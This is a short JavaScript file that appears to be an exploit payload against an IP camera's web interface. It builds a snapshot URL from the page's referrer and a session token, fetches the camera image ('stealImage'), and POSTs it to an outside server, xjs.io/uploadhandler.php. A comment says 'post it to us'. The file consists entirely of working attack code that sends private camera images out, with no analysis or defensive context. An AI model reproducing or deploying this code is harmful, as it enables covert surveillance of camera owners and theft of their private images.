function httpPost(theUrl, theData)
{
    if (theData !== null) {
        console.log(theData.length)

        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "POST", theUrl );
        xmlHttp.responseType="blob";
        xmlHttp.setRequestHeader("Content-Type", 'image/jpeg');
        xmlHttp.setRequestHeader("Content-Length", theData.length );
        xmlHttp.send(theData);
    }

}

function stealImage(theUrl)
{
    var data = null;

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, true );

    xmlHttp.responseType="blob";
    xmlHttp.setRequestHeader("Cache-Control", "no-cache" );
    xmlHttp.overrideMimeType('image/jpeg');

    xmlHttp.onreadystatechange = function(e){
        if(xmlHttp.readyState == 4 && xmlHttp.status == 200){
            console.log(xmlHttp.response.length)

            data = xmlHttp.response;

            httpPost('http://xjs.io/uploadhandler.php', data );
        }
    };

    xmlHttp.send(null);

    return data;
}

// get the image from the camera and post it to us
stealImage( document.referrer.split('/') +'/ccm/ccm_pic_get.jpg?dsess=1&dsess_nid='+mcloud_account.create_nid()+'&dtoken=p0_xxxxxxxxxx' );
